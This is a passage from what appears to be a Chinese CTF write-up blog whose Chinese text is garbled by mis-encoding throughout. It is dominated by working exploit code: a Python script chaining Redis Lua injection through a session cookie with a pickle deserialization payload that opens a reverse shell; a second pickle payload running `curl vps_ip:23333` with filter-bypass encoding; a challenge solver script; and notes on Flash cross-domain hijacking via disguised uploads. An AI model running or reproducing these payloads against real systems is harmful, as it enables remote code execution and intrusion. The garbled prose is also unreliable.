class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">req = requests.Session()</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://18.213.16.123:5000/&quot;</span> <span class="keyword">if</span> <span class="keyword">not</span> DEBUG <span class="keyword">else</span> <span class="string">&quot;http://127.0.0.1:5000/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rs</span>(<span class="params">n=<span class="number">6</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.sample(string.ascii_letters + string.digits, n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        listen_ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">        listen_port = <span class="number">1234</span></span><br><span class="line">        s = <span class="string">&#x27;python -c \&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;%s&quot;,%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);\&#x27;&#x27;</span> % (</span><br><span class="line">            listen_ip, listen_port)</span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line">x = [&#123;<span class="string">&#x27;_fresh&#x27;</span>: <span class="literal">False</span>, <span class="string">&#x27;_permanent&#x27;</span>: <span class="literal">True</span>,</span><br><span class="line">      <span class="string">&#x27;csrf_token&#x27;</span>: <span class="string">&#x27;2f898d232024ac0e0fc5f5e6fdd3a9a7dad462e8&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>: exp()&#125;]</span><br><span class="line">s = cPickle.dumps(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = urllib.quote(s)</span><br><span class="line">    yoursid = <span class="string">&#x27;vvv&#x27;</span></span><br><span class="line">    funcode = <span class="string">r&quot;local function urlDecode(s) s = string.gsub(s, &#x27;%%(%x%x)&#x27;, function(h) return string.char(tonumber(h, 16)) end) return s end&quot;</span></span><br><span class="line">    <span class="comment"># æ’å…¥payloadå¹¶é˜²æ­¢del</span></span><br><span class="line">    sid = <span class="string">&#x27;%s\\&quot; &#125; %s &#x27;</span> % (rs(<span class="number">6</span>), funcode) + \</span><br><span class="line">        <span class="string">&#x27;redis.call(\\&quot;set\\&quot;,\\&quot;bookhub:session:%s\\&quot;,\\urlDecode(&quot;%s\\&quot;)) inputs = &#123; \&quot;bookhub:session:%s\&quot; &#125; --&#x27;</span> % (</span><br><span class="line">            yoursid, payload, yoursid)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&#x27;bookhub-session=&quot;x%s&quot;&#x27;</span> % sid,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;X-CSRFToken&#x27;</span>: <span class="string">&#x27;ImY3NGI2MDcxNmQ5NmYwYjExZTQ4N2ZlYTMxNDg0ZGQ3NjA0MGU2OWIi.Dj9f9w.WL0VY6e2y6edFTh6QcOKo9DnzLw&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res = req.get(URL + <span class="string">&#x27;login/&#x27;</span>, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">        html = res.content</span><br><span class="line">        r = re.findall(<span class="string">r&#x27;csrf_token&quot; type=&quot;hidden&quot; value=&quot;(.*?)&quot;&gt;&#x27;</span>, html)</span><br><span class="line">        <span class="keyword">if</span> r:</span><br><span class="line">            headers[<span class="string">&#x27;X-CSRFToken&#x27;</span>] = r[<span class="number">0</span>]</span><br><span class="line">            <span class="comment"># refresh_session</span></span><br><span class="line">            data = &#123;<span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">            res = req.post(URL + <span class="string">&#x27;admin/system/refresh_session/&#x27;</span>,</span><br><span class="line">                           data=data, headers=headers)</span><br><span class="line">            <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(res.content)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(res.content)</span><br><span class="line">            <span class="comment"># fuck</span></span><br><span class="line">            headers[<span class="string">&#x27;Cookie&#x27;</span>] = <span class="string">&#x27;bookhub-session=vvv&#x27;</span></span><br><span class="line">            res = req.get(URL + <span class="string">&#x27;admin/&#x27;</span>, headers=headers)</span><br><span class="line">            <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(res.content)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(res.content)</span><br></pre></td></tr></table></figure><p>ç„¶åskyçš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        s = <span class="string">&quot;&quot;&quot;curl vps_ip:23333&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(s,))</span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">s = cPickle.dumps(e)</span><br><span class="line">s_bypass = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    s_bypass +=<span class="string">&quot;string.char(%s)..&quot;</span>%<span class="built_in">ord</span>(i)</span><br><span class="line">evilcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">redis.call(&quot;set&quot;,&quot;bookhub:session:skycool&quot;,%s)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>%s_bypass[:-<span class="number">2</span>]</span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">6f17c248-ed0d-4d74-bba6-21b9342c854a&quot;,%s,&quot;bookhub:session:skycool</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>%evilcode</span><br><span class="line"><span class="built_in">print</span> payload.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>å†™å¥½ä¹‹åè®¿é—®ä»¥ä¸‹loginé¡µé¢å°±å¯ä»¥è·å¾—åå¼¹çš„shell</p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å®‰æ’ä¸ƒæœˆæœˆèµ›web</title>
      <link href="/2018/07/28/%E5%AE%89%E6%81%92%E4%B8%83%E6%9C%88%E6%9C%88%E8%B5%9Bweb/"/>
      <url>/2018/07/28/%E5%AE%89%E6%81%92%E4%B8%83%E6%9C%88%E6%9C%88%E8%B5%9Bweb/</url>
      
        <content type="html"><![CDATA[<p>å¤§æ¦‚è¿˜è¡Œ,è™½ç„¶æœ‰å¾ˆå¤šå¥‡å¥‡æ€ªæ€ªçš„åœ°æ–¹</p><h3 id="order">order</h3><p>orderæ³¨å…¥,ä¸¢sqlmap ç›´æ¥è·‘å‡ºç»“æœ</p><h3 id="å°±è¿™ä¹ˆç›´æ¥">å°±è¿™ä¹ˆç›´æ¥</h3><p>ç»™äº†ä¸ªæºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$key</span> = <span class="string">&quot;********&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>()); </span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">100</span>); </span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">100</span>); </span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">100</span>); </span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">100</span>); </span><br><span class="line"><span class="variable">$e</span> = <span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = (((<span class="variable">$a</span> - <span class="variable">$b</span>)/<span class="variable">$c</span>)+<span class="variable">$d</span>) * <span class="variable">$e</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$key</span>.<span class="variable">$result</span>.<span class="variable">$key</span>);</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åä¸€ä¸ªæäº¤é¡µé¢,ç„¶åæˆ‘è¿˜ä»¥ä¸ºæ˜¯ä»€ä¹ˆç»•è¿‡,ç„¶åè¿˜çŒœå¼±ç±»å‹,æäº†åŠå¤©åšä¸å‡ºæ¥,çœ‹äº†wpå‘ç°ä¹Ÿæ˜¯ç¥å¥‡å¥½å§,å®ƒæ˜¯ç”¨æ—¶é—´ç§å­ç”Ÿæˆéšæœºæ•°ç„¶ååŠ ç›md5,<strong>éšæœºæäº¤ä¸€ä¸ªmd5çš„å€¼</strong>å°±å¯ä»¥åœ¨æºç é‡Œè·å¾—åŠ å¯†ç»“æœ,ç„¶åå†æŠŠç»“æœæäº¤å°±å¥½äº†,æ‰“æ‰°äº†,ç¡®å®æ²¡çœ‹æ‡‚è¿™ä¸ªå‡ºé¢˜æ€è·¯å¥½å§.. è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">url=<span class="string">&quot;http://101.71.29.5:10003/flag.php&quot;</span></span><br><span class="line">data=&#123;<span class="string">&quot;answer&quot;</span>:<span class="string">&quot;0e342768416822451524974117254469&quot;</span>&#125;</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line">soup=BeautifulSoup(r.text,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(soup.p)</span><br><span class="line">md5=re.findall(<span class="string">r&quot;&lt;!--(.*?)--&gt;&quot;</span>,<span class="built_in">str</span>(soup.p))</span><br><span class="line">data=md5[<span class="number">0</span>]</span><br><span class="line">data=&#123;<span class="string">&quot;answer&quot;</span>:data&#125;</span><br><span class="line">r=requests.post(url,data=data)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h3 id="ç®€å†æ¥äº†">ç®€å†æ¥äº†</h3><p>å¼€å§‹èµ°é”™äº†è·¯,æƒ³ä¼ shell,ä½†å…¶å®ä¼ ä¸äº†,æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;init.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">z_validate_captcha</span>())&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;éªŒè¯ç é”™è¯¯&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$email</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>])?<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]):<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$url</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])?<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]):<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$file</span> = <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])?<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]:<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$email</span> == <span class="literal">false</span>  <span class="variable">$url</span> == <span class="literal">false</span>  <span class="variable">$file</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Invalid Input&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$email</span>, FILTER_VALIDATE_EMAIL))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Invalid Email&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$url</span>, FILTER_VALIDATE_URL)  (<span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>, <span class="string">&#x27;http://&#x27;</span>) !== <span class="number">0</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>, <span class="string">&#x27;https://&#x27;</span>) !== <span class="number">0</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Invalid URL&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>]  <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>*<span class="number">1024</span>  !<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Invalid File&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ext</span> = <span class="title function_ invoke__">getExt</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="keyword">array</span>(<span class="string">&#x27;.jpg&#x27;</span>,<span class="string">&#x27;.jpeg&#x27;</span>, <span class="string">&#x27;.png&#x27;</span>, <span class="string">&#x27;.docx&#x27;</span>, <span class="string">&#x27;.doc&#x27;</span>)))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Invalid File Type&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$file_checked</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="keyword">array</span>(<span class="string">&#x27;.jpg&#x27;</span>,<span class="string">&#x27;.jpeg&#x27;</span>, <span class="string">&#x27;.png&#x27;</span>)))&#123;</span><br><span class="line">        <span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$finfo</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Opening fileinfo database failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$mime</span> = <span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">        <span class="title function_ invoke__">finfo_close</span>(<span class="variable">$finfo</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$mime</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Invalid Filename&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$arr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;;&#x27;</span>, <span class="variable">$mime</span>);</span><br><span class="line">        <span class="variable">$mime</span> = <span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$mime</span> == <span class="literal">false</span>  !<span class="title function_ invoke__">in_array</span>(<span class="variable">$mime</span>, <span class="keyword">array</span>(<span class="string">&#x27;image/gif&#x27;</span>, <span class="string">&#x27;image/jpeg&#x27;</span>, <span class="string">&#x27;image/jpg&#x27;</span>, <span class="string">&#x27;image/png&#x27;</span>, <span class="string">&#x27;application/octet-stream&#x27;</span>)))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Invalid Filename&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_checked</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="keyword">array</span>(<span class="string">&#x27;.docx&#x27;</span>, <span class="string">&#x27;.doc&#x27;</span>)))&#123;</span><br><span class="line">        <span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$finfo</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Opening fileinfo database failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$mime</span> = <span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">        <span class="title function_ invoke__">finfo_close</span>(<span class="variable">$finfo</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$mime</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Invalid Filename&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$arr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;;&#x27;</span>, <span class="variable">$mime</span>);</span><br><span class="line">        <span class="variable">$mime</span> = <span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$mime</span> == <span class="literal">false</span>  !<span class="title function_ invoke__">in_array</span>(<span class="variable">$mime</span>, <span class="keyword">array</span>(<span class="string">&#x27;application/msword&#x27;</span>,<span class="string">&#x27;application/word&#x27;</span>, <span class="string">&#x27;application/vnd.openxmlformats-officedocument.wordprocessingml.document&#x27;</span>)))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Invalid Filename&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_checked</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_checked</span> !== <span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Invalid File Type&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;./upload/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>().<span class="title function_ invoke__">microtime</span>()).<span class="variable">$ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;ä¸Šä¼ å¤±è´¥&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">save_resume</span>(<span class="variable">$email</span>, <span class="variable">$url</span>, <span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;æäº¤æˆåŠŸï¼š&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;é‚®ç®±ï¼š&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$email</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;ä¸ªäººç½‘ç«™ï¼š&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;ç®€å†åœ°å€ï¼š&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå…¶å®æ˜¯ä¸ªcsrf,æˆ‘ä¹ŸçœŸæ˜¯é²¸äº†,æˆ‘ç¡®å®æœ‰æµ‹è¯•é“¾æ¥é‚£ä¸ªåœ°æ–¹æœ‰æ²¡æœ‰botæ¥è®¿é—®,ä½†æ˜¯æ²¡æœ‰!æ²¡æœ‰!è¿™ä¸ªé¢˜å¡äº†æˆ‘ä¸¤å¤©... å¥½å§,ä¸è¿‡å…¶å®å°±ç®—çŸ¥é“è¿™é‡Œä¼šæœ‰botæ¥è®¿é—®æˆ‘è¿™é“é¢˜å¯èƒ½ä¹Ÿè§£ä¸å‡ºæ¥,å› ä¸ºè€ƒåˆ°äº†ä¸€ä¸ªæˆ‘å¹¶ä¸ä¼šçš„ç‚¹,è¿™é‡Œé‡ç‚¹è®°å½•ä¸€ä¸‹:<a href="http://www.freebuf.com/articles/web/35353.html" title="Flashè·¨åŸŸæ•°æ®åŠ«æŒæ¼æ´">Flashè·¨åŸŸæ•°æ®åŠ«æŒæ¼æ´</a> è¿™ä¸ªæ¼æ´è®²çš„å¤§è‡´å¦‚ä¸‹: å½“æŸç«™ç‚¹å­˜åœ¨ä¸Šä¼ ç‚¹ä¸”å¹¶æ²¡æœ‰æ£€æŸ¥æ–‡ä»¶å†…å®¹çš„æ—¶å€™,æˆ‘ä»¬å°±å¯ä»¥ä¸Šä¼ ä¸€ä¸ªflashæ–‡ä»¶,ç„¶ååç¼€ä½¿ç”¨å¯ä»¥ä¸Šä¼ çš„åç¼€,æ¯”å¦‚jpgä¹‹ç±»çš„,ç„¶åæ ¸å¿ƒéƒ¨åˆ†æ˜¯objectæ ‡ç­¾åœ¨åŒ…å«flashæ–‡ä»¶æ—¶æ²¡æœ‰å¯¹åµŒå…¥çš„æ–‡ä»¶åç¼€è¿›è¡Œåˆ¤æ–­ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåªè¦æ–‡ä»¶å†…å®¹åŒ…å«äº†æ­£å¸¸çš„flashæ–‡ä»¶ä»£ç ï¼Œå°±èƒ½å¤Ÿè¢«objectæ ‡ç­¾æˆåŠŸåŠ è½½å¹¶æ‰§è¡Œã€‚è€ŒActionScriptä¸­åˆæœ‰å¾ˆå¤šapiå¯ä»¥è®©flashå‘é€ç½‘ç»œè¯·æ±‚,è¿™å°±å¯ä»¥å°†flashä¼ åˆ°ç›®æ ‡åŸŸç„¶åæ„é€ æ¶æ„ä»£ç è·å–æŸäº›é¡µé¢äº†,å…·ä½“çœ‹é¢˜ã€‚ å¾ˆå‘çˆ¹çš„ä¸€é“é¢˜ï¼Œä¸»è¦æ˜¯åˆ©ç”¨äº†githubä¸Šä¸€ä¸ªCSRFé¡¹ç›®ï¼š<a href="https://github.com/nccgroup/CrossSiteContentHijacking" title="https://github.com/nccgroup/CrossSiteContentHijacking">https://github.com/nccgroup/CrossSiteContentHijacking</a> é™åˆ¶äº†é‚®ç®±ã€URLæ ¼å¼ï¼Œæ–‡ä»¶å¤§å°ã€‚ä»¥åŠä¸Šä¼ çš„æ–‡ä»¶ç±»å‹å’ŒMIMEç±»å‹ã€‚æ— æ³•ç»•è¿‡ä¸Šä¼ PHPæ–‡ä»¶æˆ–è€…åˆ©ç”¨æ–‡ä»¶åŒ…å«ä¸Šä¼ å›¾ç‰‡é©¬ ç¬¬ä¸€ä¸ªç‚¹:flashçš„ä¸‰ç§æ–‡ä»¶å¤´:CWS,FWS,ZWS[æœ€æ–°çš„] ç”±äºZWSæ˜¯æ–°å…´çš„æ–‡ä»¶æ ¼å¼,phpæš‚æ—¶ä¸æ”¯æŒ,æ‰€ä»¥phpåœ¨è§£æcwså’Œfwsæ 